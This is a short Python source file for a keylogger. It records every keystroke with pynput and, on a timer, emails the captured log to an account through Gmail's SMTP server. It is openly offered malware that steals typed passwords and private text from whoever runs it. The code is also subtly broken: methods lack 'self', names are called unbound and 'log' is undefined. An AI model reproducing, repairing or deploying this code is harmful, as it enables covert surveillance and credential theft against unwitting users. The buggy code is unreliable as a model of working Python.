import threading
import pynput.keyboard
import subprocess, smtplib

class Keylogger:
    def __init__(self,interval, email, password):
        self.log = ""
        self.interval = interval
        self.email = email
        self.password = password
    
    def append_to_log(key_input):
        self.log += str(key_input)

    def process_key(key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = ' ' + str(key) + ' '
        append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(log)

        self.log = ''
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, mesage):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email,self.email,mesage)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join() 